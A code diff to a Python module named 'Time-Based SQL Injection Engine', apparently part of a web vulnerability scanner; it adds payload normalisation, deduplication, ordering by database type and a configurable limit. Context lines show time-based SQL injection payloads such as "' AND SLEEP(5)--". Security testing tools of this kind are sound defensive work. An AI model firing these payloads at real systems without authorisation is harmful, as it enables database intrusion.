@@ -5,6 +5,7 @@ Time-Based SQL Injection Engine
 import time
 import os
 from utils.http_client import HttpClient
+from config import MAX_PAYLOADS_PER_TEST, SKIP_DUPLICATE_PAYLOADS, NORMALIZE_PAYLOADS, SMART_PAYLOAD_ORDERING
 
 class TimeEngine:
     def __init__(self):
@@ -13,7 +14,7 @@ class TimeEngine:
         self.payloads = self._load_payloads()
     
     def _load_payloads(self):
-        """Load time-based payloads from file"""
+        """Load time-based payloads from file with smart handling"""
         default_payloads = [
             # MySQL Time-based payloads
             "' AND SLEEP(5)--", "' OR SLEEP(5)--", "'; SLEEP(5)--",
@@ -46,13 +47,48 @@ class TimeEngine:
             if os.path.exists(self.payloads_file):
                 with open(self.payloads_file, 'r', encoding='utf-8') as f:
                     payloads = [line.strip() for line in f if line.strip() and not line.startswith('#')]
-                return payloads[:30]
+                
+                # Normalize payloads if enabled
+                if NORMALIZE_PAYLOADS:
+                    payloads = [' '.join(p.split()) for p in payloads]
+                
+                # Remove duplicates if enabled
+                if SKIP_DUPLICATE_PAYLOADS:
+                    payloads = list(dict.fromkeys(payloads))
+                
+                # Smart ordering
+                if SMART_PAYLOAD_ORDERING:
+                    payloads = self._order_payloads(payloads)
+                
+                # Apply limit if specified
+                if MAX_PAYLOADS_PER_TEST:
+                    payloads = payloads[:MAX_PAYLOADS_PER_TEST]
+                
+                print(f"   Loaded {len(payloads)} unique time payloads")
+                return payloads
             else:
                 print(f"   Payload file not found: {self.payloads_file}, using defaults")
                 return default_payloads
         except Exception as e:
             print(f"   Error loading payloads: {e}, using defaults")
             return default_payloads
+    
+    def _order_payloads(self, payloads):
+        """Order payloads by database type (most common first)"""
+        def payload_priority(payload):
+            payload_lower = payload.lower()
+            if 'sleep' in payload_lower and 'pg_sleep' not in payload_lower:
+                return 0  # MySQL SLEEP
+            elif 'waitfor' in payload_lower:
+                return 1  # MSSQL
+            elif 'pg_sleep' in payload_lower:
+                return 2  # PostgreSQL
+            elif 'benchmark' in payload_lower:
+                return 3  # MySQL BENCHMARK
+            else:
+                return 4  # Other
+        
+        return sorted(payloads, key=payload_priority)
     
     def test(self, param, url):
         """Test for time-based SQL injection"""
